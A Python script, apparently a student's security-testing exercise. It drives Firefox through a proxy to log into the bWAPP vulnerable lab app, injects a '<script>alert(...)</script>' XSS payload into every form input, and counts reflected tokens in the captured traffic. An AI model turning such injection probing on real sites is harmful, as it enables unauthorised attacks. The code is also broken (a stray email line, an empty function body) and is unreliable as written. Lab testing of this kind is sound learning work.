from browsermobproxy import Server
import re
import harparser
import json
#Proxy server
server = Server("/root/Desktop/browsermob-proxy-2.1.0-beta-4/bin/browsermob-proxy")
server.start()
proxy = server.create_proxy()
from selenium import webdriver

#load what you want to test with (change to phantomjs later)
profile = webdriver.FirefoxProfile()
#Setup Proxy
profile.set_proxy(proxy.selenium_proxy())
driver = webdriver.Firefox(firefox_profile=profile)
#Get a a web page
proxy.new_har("bWAPP")

d.williams3236@stduent.leedsbecektt.ac.uk
driver.get("http://192.168.127.144/bWAPP/login.php")



# Fetch username, password input boxes and submit button
def auth():
username = driver.find_element_by_id("login")
password = driver.find_element_by_name("password")
submit = driver.find_element_by_name("form")

#if driver.find_element_by_tag_name("input")

# username and passwords
username.send_keys("bee")
password.send_keys("bug")

#print HAR BLOB


# click on the submit button
submit.click()

driver.get("http://192.168.127.144/bWAPP/htmli_get.php")
token = "Se1337sh"
# Payload Variables
PLOAD = "<script>alert("+ token +")</script>"

#Find inputs

INPUT = driver.find_elements_by_tag_name('input')

def submit():
    try:
        submit = driver.find_element_by_name("form")
        print "chill"
    except Exception,e:
        print str(e)


submit = driver.find_element_by_name("form")

# def find_input():
#     while True:
#         try:
#
#             for i in INPUT:
#                 i.send_keys(PLOAD)
#                 return False
#                 break
#
#         except ValueError:
#             print ("an error happend")
#             return False
#
# find_input()


for i in INPUT:
    i.send_keys(PLOAD)

submit.click()

def ref_get():

    HAR = proxy.har
    # print HAR
    detect = re.findall(r"%s"%token, str(HAR))
    print "Number of tokens detected in Reflected Get " + str(len(detect))
    print harparser(HAR)
ref_get()


# lastname = driver.find_element_by_name("lastname")
# lastname.send_keys(PLOAD)
# submit.click()

#
# inputboxes = driver.find_elements_by_tag_name("input")
# for inputbox in inputboxes:
#     print inputbox
#Find inputs
# if INPUT != "":
#     INPUT.send_keys(PLOAD)
#
#     submit.click()
# else:
#     print "No Input Tags found"

#

#
# if INPUT == True:
#     INPUT.send_keys(PLOAD)
# else:
#     print "No input tags found"
